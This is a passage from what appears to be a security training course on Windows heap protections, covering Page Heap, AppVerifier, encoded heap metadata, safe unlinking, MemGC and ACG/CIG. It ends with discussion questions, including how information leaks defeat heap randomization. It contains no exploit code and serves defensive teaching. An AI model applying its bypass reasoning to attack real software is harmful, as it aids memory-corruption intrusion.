- **With heap encoding**: May detect corruption on subsequent heap operations

**Protection effectiveness ranking:**

1. **Page Heap** (best): Immediate detection, prevents corruption entirely
2. **Heap integrity checks**: Detects corruption on HeapFree or validation
3. **No mitigations** (worst): Full exploitation possible

### Key Takeaways

1. **Heap overflows are NOT reliably detected** without Page Heap: the standard heap
   only checks metadata on free/realloc. If the overflow doesn't corrupt an encoded
   header, it goes undetected. Page Heap (`gflags /p /enable /full`) places guard
   pages after every allocation for immediate detection.
2. **UAF bugs are silent without AppVerifier**: freed memory often still contains valid
   data, so reads succeed and writes don't crash. AppVerifier fills freed memory with
   `0xF0F0F0F0` and places guard pages — making UAF instantly visible.
3. **Heap isolation prevents type-confusion UAF**: this is why browsers use PartitionAlloc.
   Even if you can trigger a UAF in one object type, you cannot reclaim that memory with
   a different type from a different heap partition.
4. **Encoded heap metadata** (XOR with per-heap key) prevents attackers from crafting
   fake heap headers. The key changes per process and per heap instance.
5. **Safe unlinking** validates forward/backward pointer consistency before removing a
   chunk from a free list. This blocks classic unlink-based write-what-where attacks.
6. **Segment Heap** (Windows 10+ default for modern apps) adds allocation order
   randomization and guard pages between segments — making heap spraying harder.
7. **MemGC** delays memory reuse until all live pointers are gone — but has 10-15%
   overhead and is primarily used in Edge/browser engines.
8. **ACG + CIG together** create a strong code execution prevention: ACG blocks dynamic
   code generation, CIG blocks unsigned DLL loading. Combined, an attacker cannot
   introduce new executable code into the process.
9. **Always use `fflush(stdout)` before operations that may crash** — otherwise printf
   output is lost in the crash dump.

### Discussion Questions

1. **How do encoded heap headers prevent exploitation?**

   > Each heap has a random encoding key (generated at heap creation). All metadata
   > fields are XORed with this key before writing and after reading. An attacker who
   > corrupts metadata must know the encoding key to craft valid fake headers. The key
   > is stored in the `_HEAP` structure but ASLR makes finding it non-trivial.

2. **Why doesn't Windows use full garbage collection?**

   > GC requires tracking ALL references to every allocation — impossible in C/C++
   > where pointers can be cast to integers, stored in unions, or derived from
   > arithmetic. MemGC approximates this for specific allocator contexts (like Edge's
   > DOM engine) but cannot work for arbitrary C code.

3. **What's the trade-off between MemGC security and performance?**

   > MemGC delays freeing -> higher memory usage (quarantined allocations stay alive).
   > Periodic scanning has 10-15% CPU overhead. The memory overhead can be significant
   > for long-running processes. This is acceptable for browser tabs (short-lived) but
   > not for database servers or OS kernels.

4. **Can heap randomization be defeated with information leaks?**
   > Yes. If an attacker can leak heap addresses (via format string, partial overread,
   > or timing side channel), they can calculate the relative positions of heap chunks
   > and target specific metadata. This is exactly what we demonstrated in Day 2
   > Technique 1: leaking stack cookies and code pointers via format strings. The same
   > principle applies to heap cookies and heap metadata encoding keys.

